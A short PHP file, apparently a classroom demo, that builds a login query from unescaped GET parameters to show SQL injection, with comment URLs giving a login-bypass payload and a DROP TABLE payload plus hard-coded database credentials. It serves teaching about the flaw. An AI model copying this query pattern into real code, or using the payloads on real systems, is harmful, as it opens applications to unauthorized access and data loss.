<?php
/**********************************************************************
 * SQL Injection attack
 * 
 * To demonstrate the exploit, try the following URL's:
 *
 * Fail:    http://section8/sqlinject.php?user=chris&password=badpwd
 * Success: http://section8/sqlinject.php?user=chris&password=password
 * Exploit: http://section8/sqlinject.php?user=chris&password='OR''='
 * Exploit: http://section8/sqlinject.php?user=';DROP TABLE test;
 **********************************************************************/
 
// database connection
$dsn = 'mysql:host=localhost;dbname=jharvard_section8';
$db_user = 'jharvard';
$db_password = 'crimson';
$dbh = new PDO($dsn, $db_user, $db_password);

// login credentials
$user = isset($_GET['user']) ? $_GET['user'] : '';
$password = isset($_GET['password']) ? $_GET['password'] : '';

// database query to test login credentials
$sql = sprintf("SELECT 1
                FROM users
                WHERE id='%s'
                AND pwd='%s'", $user, $password);

// authenticate user
$success = false;
foreach($dbh->query($sql) as $row)
{
    // if any rows returned, we logged in
    $success = true;
}

// print results
if ($success)
    echo "Successful login!\n";
else
    echo "Bad username or password\n";
?>
